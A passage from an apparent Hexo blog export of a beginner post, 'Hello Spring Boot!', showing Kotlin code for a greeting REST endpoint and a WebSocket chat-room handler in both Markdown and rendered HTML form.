val OPEN = \"OPEN\"\n    const val CLOSE = \"CLOSE\"\n    const val MESSAGE = \"MESSAGE\"\n}\n\n@Component\nclass ChatRoomWsHandler : TextWebSocketHandler() {\n\n    private val objectMapper = ObjectMapper()\n    private val connectedSessions = arrayListOf<WebSocketSession>()\n\n    override fun afterConnectionEstablished(session: WebSocketSession) {\n        connectedSessions.add(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.OPEN, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username connect with avatar $avatar\")\n    }\n\n    override fun handleTextMessage(session: WebSocketSession, message: TextMessage) {\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach {\n            it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.MESSAGE, username.toString(),\n                message.payload, avatar.toString()).stringify()))\n        }\n        println(\"[ChatRoom] $username send message ${message.payload} with avatar $avatar\")\n    }\n\n    override fun afterConnectionClosed(session: WebSocketSession, closeStatus: CloseStatus) {\n        connectedSessions.remove(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.CLOSE, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username disconnect with avatar $avatar\")\n    }\n\n    private fun ChatWsMessageBean.stringify() = objectMapper.writeValueAsString(this)\n}\n\n@Configuration\n@EnableWebSocket\nclass WebSocketConfig : WebSocketConfigurer {\n\n    @Autowired\n    private lateinit var chatRoomWsHandler: ChatRoomWsHandler\n\n    override fun registerWebSocketHandlers(registry: WebSocketHandlerRegistry) {\n        registry.addHandler(chatRoomWsHandler, \"chatroom\")\n            .setAllowedOrigins(\"*\")\n    }\n}\n~~~\n\nAndroid\n\nXD","source":"_posts/hello-spring-boot.md","raw":"---\ntitle: Hello Spring Boot!\ndate: 2021-12-25\nauthor: \nhide: false\nsummary: spring boot\ncategories: \ntags:\n  - Kotlin\n  - SpringBoot\n  - \n---\n\n# Hello Spring Boot\n\nGoNode.js\n\nSpring BootKotlinGradle\n\nSpring Bootjava\n\njsonapi\n\n~~~kotlin\n@RestController\nclass TestController {\n\n    @GetMapping(\"/greeting\")\n    fun greeting(@RequestParam(value = \"name\", defaultValue = \"World\") name: String) = BaseResponseBean(\"Hello $name\")\n\n}\n\ndata class BaseResponseBean<T>(\n    val data: T?,\n    val errorCode: Int = 0,\n    val errorMsg: String = \"\"\n)\n~~~\n\nTypeScriptSpring Boot\n\n\n\n~~~kotlin\ndata class ChatWsMessageBean(\n    val type: String,\n    val username: String,\n    val data: String?,\n    val avatar: String\n)\n\nobject WebSocketMessageType {\n    const val OPEN = \"OPEN\"\n    const val CLOSE = \"CLOSE\"\n    const val MESSAGE = \"MESSAGE\"\n}\n\n@Component\nclass ChatRoomWsHandler : TextWebSocketHandler() {\n\n    private val objectMapper = ObjectMapper()\n    private val connectedSessions = arrayListOf<WebSocketSession>()\n\n    override fun afterConnectionEstablished(session: WebSocketSession) {\n        connectedSessions.add(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.OPEN, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username connect with avatar $avatar\")\n    }\n\n    override fun handleTextMessage(session: WebSocketSession, message: TextMessage) {\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach {\n            it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.MESSAGE, username.toString(),\n                message.payload, avatar.toString()).stringify()))\n        }\n        println(\"[ChatRoom] $username send message ${message.payload} with avatar $avatar\")\n    }\n\n    override fun afterConnectionClosed(session: WebSocketSession, closeStatus: CloseStatus) {\n        connectedSessions.remove(session)\n        val username = session.attributes[\"username\"] ?: \"unnamed\"\n        val avatar = session.attributes[\"avatar\"] ?: \"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"\n        connectedSessions.forEach { it.sendMessage(TextMessage(ChatWsMessageBean(WebSocketMessageType.CLOSE, username.toString(), null, avatar.toString()).stringify())) }\n        println(\"[ChatRoom] $username disconnect with avatar $avatar\")\n    }\n\n    private fun ChatWsMessageBean.stringify() = objectMapper.writeValueAsString(this)\n}\n\n@Configuration\n@EnableWebSocket\nclass WebSocketConfig : WebSocketConfigurer {\n\n    @Autowired\n    private lateinit var chatRoomWsHandler: ChatRoomWsHandler\n\n    override fun registerWebSocketHandlers(registry: WebSocketHandlerRegistry) {\n        registry.addHandler(chatRoomWsHandler, \"chatroom\")\n            .setAllowedOrigins(\"*\")\n    }\n}\n~~~\n\nAndroid\n\nXD","slug":"hello-spring-boot","published":1,"updated":"2022-11-24T02:59:48.272Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jti0019sfklbmdg9mpg","content":"<h1 id=\"Hello-Spring-Boot\"><a href=\"#Hello-Spring-Boot\" class=\"headerlink\" title=\"Hello Spring Boot\"></a>Hello Spring Boot</h1><p>GoNode.js</p>\n<p>Spring BootKotlinGradle</p>\n<p>Spring Bootjava</p>\n<p>jsonapi</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@RestController</span>\n<span class=\"token keyword\">class</span> TestController <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/greeting\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">greeting</span><span class=\"token punctuation\">(</span><span class=\"token annotation builtin\">@RequestParam</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> defaultValue <span class=\"token operator\">=</span> <span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">BaseResponseBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello <span class=\"token interpolation variable\">$name</span>\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> BaseResponseBean<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorCode<span class=\"token operator\">:</span> Int <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorMsg<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>TypeScriptSpring Boot</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> username<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> avatar<span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">object</span> WebSocketMessageType <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OPEN <span class=\"token operator\">=</span> <span class=\"token string\">\"OPEN\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> CLOSE <span class=\"token operator\">=</span> <span class=\"token string\">\"CLOSE\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> MESSAGE <span class=\"token operator\">=</span> <span class=\"token string\">\"MESSAGE\"</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Component</span>\n<span class=\"token keyword\">class</span> ChatRoomWsHandler <span class=\"token operator\">:</span> <span class=\"token function\">TextWebSocketHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> objectMapper <span class=\"token operator\">=</span> <span class=\"token function\">ObjectMapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> connectedSessions <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>WebSocketSession<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionEstablished</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>OPEN<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> connect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">handleTextMessage</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span> TextMessage<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>MESSAGE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                message<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> send message <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>message<span class=\"token punctuation\">.</span>payload<span class=\"token delimiter variable\">}</span></span> with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionClosed</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> closeStatus<span class=\"token operator\">:</span> CloseStatus<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>CLOSE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> disconnect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> ChatWsMessageBean<span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> objectMapper<span class=\"token punctuation\">.</span><span class=\"token function\">writeValueAsString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Configuration</span>\n<span class=\"token annotation builtin\">@EnableWebSocket</span>\n<span class=\"token keyword\">class</span> WebSocketConfig <span class=\"token operator\">:</span> WebSocketConfigurer <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">lateinit</span> <span class=\"token keyword\">var</span> chatRoomWsHandler<span class=\"token operator\">:</span> ChatRoomWsHandler\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">registerWebSocketHandlers</span><span class=\"token punctuation\">(</span>registry<span class=\"token operator\">:</span> WebSocketHandlerRegistry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addHandler</span><span class=\"token punctuation\">(</span>chatRoomWsHandler<span class=\"token punctuation\">,</span> <span class=\"token string\">\"chatroom\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">setAllowedOrigins</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Android</p>\n<p>XD</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"Hello-Spring-Boot\"><a href=\"#Hello-Spring-Boot\" class=\"headerlink\" title=\"Hello Spring Boot\"></a>Hello Spring Boot</h1><p>GoNode.js</p>\n<p>Spring BootKotlinGradle</p>\n<p>Spring Bootjava</p>\n<p>jsonapi</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@RestController</span>\n<span class=\"token keyword\">class</span> TestController <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/greeting\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">greeting</span><span class=\"token punctuation\">(</span><span class=\"token annotation builtin\">@RequestParam</span><span class=\"token punctuation\">(</span>value <span class=\"token operator\">=</span> <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> defaultValue <span class=\"token operator\">=</span> <span class=\"token string\">\"World\"</span><span class=\"token punctuation\">)</span> name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">BaseResponseBean</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello <span class=\"token interpolation variable\">$name</span>\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> BaseResponseBean<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorCode<span class=\"token operator\">:</span> Int <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> errorMsg<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>TypeScriptSpring Boot</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">data</span> <span class=\"token keyword\">class</span> <span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword\">val</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> username<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">val</span> avatar<span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">object</span> WebSocketMessageType <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> OPEN <span class=\"token operator\">=</span> <span class=\"token string\">\"OPEN\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> CLOSE <span class=\"token operator\">=</span> <span class=\"token string\">\"CLOSE\"</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">val</span> MESSAGE <span class=\"token operator\">=</span> <span class=\"token string\">\"MESSAGE\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token annotation builtin\">@Component</span>\n<span class=\"token keyword\">class</span> ChatRoomWsHandler <span class=\"token operator\">:</span> <span class=\"token function\">TextWebSocketHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> objectMapper <span class=\"token operator\">=</span> <span class=\"token function\">ObjectMapper</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> connectedSessions <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>WebSocketSession<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionEstablished</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>OPEN<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> connect with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">handleTextMessage</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> message<span class=\"token operator\">:</span> TextMessage<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> username <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"unnamed\"</span>\n        <span class=\"token keyword\">val</span> avatar <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>attributes<span class=\"token punctuation\">[</span><span class=\"token string\">\"avatar\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?:</span> <span class=\"token string\">\"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp\"</span>\n        connectedSessions<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">sendMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">TextMessage</span><span class=\"token punctuation\">(</span><span class=\"token function\">ChatWsMessageBean</span><span class=\"token punctuation\">(</span>WebSocketMessageType<span class=\"token punctuation\">.</span>MESSAGE<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                message<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">,</span> avatar<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[ChatRoom] <span class=\"token interpolation variable\">$username</span> send message <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>message<span class=\"token punctuation\">.</span>payload<span class=\"token delimiter variable\">&#125;</span></span> with avatar <span class=\"token interpolation variable\">$avatar</span>\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">afterConnectionClosed</span><span class=\"token punctuation\">(</span>session<span class=\"token operator\">:</span> WebSocketSession<span class=\"token punctuation\">,</span> closeStatus<span class=\"token operator\">:</span> CloseStatus<span class=\"token 